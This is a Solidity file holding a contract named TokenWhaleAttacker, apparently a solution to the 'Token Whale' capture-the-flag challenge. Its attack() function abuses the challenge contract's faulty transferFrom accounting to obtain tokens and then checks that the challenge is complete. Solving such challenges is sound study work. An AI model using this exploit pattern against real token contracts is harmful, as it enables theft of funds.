pragma solidity ^0.7.3;

interface IChallenge {
    function isComplete() external view returns (bool);

    function balanceOf(address) external view returns (uint256);

    function transferFrom(address from, address to, uint256 value) external;

    function transfer(address to, uint256 value) external;
}

contract TokenWhaleAttacker {
    IChallenge private challenge;
    uint256 private tokenAmount;
    uint private getAmount;
    constructor (address challengeAddress, uint256 _tokenAmount,uint256 _getAmount) {
        challenge = IChallenge(challengeAddress);
        tokenAmount = _tokenAmount;
        getAmount = _getAmount;
    }

    function attack() external {
        challenge.transferFrom(msg.sender, msg.sender, tokenAmount);
        challenge.transfer(msg.sender, getAmount);
        require(challenge.isComplete(), "get number of token Insufficient!");
    }
}